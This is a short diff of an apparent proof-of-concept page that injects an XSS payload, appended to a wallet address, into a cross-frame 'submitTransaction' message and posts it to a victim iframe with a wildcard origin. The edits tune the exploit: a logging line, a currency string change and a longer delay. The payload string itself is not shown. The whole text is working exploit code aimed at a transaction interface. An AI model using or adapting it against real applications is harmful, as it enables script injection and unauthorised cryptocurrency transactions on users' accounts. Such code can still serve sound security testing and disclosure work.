@@ -20,7 +20,8 @@
             // const valid_format_address = "177c1e81f771578941e15b20ce19178f9a";
             const valid_format_address = "177c1e81f771578941e15b20ce19178f9a";
 
-             const final_address_payload = valid_format_address + xss_payload;
+            const final_address_payload = valid_format_address + xss_payload;
+            console.log("Final payload for toAddress:", final_address_payload);
 
             const maliciousMessage = {
                 type: 'submitTransaction',
@@ -29,7 +30,7 @@
                     // toAddress: transactionData.toAddress,
                     toAddress: final_address_payload,
                     // Tetap suntikkan payload di sini
-                    currency: "btc",
+                    currency: "BTC",
                     amount: 1
                 }
             };
@@ -38,7 +39,7 @@
             setTimeout(() => {
                 victimIframe.postMessage(maliciousMessage, '*');
                 console.log("Malicious message sent to iframe.");
-            }, 1000);
+            }, 2500);
         };
     </script>
 </body>
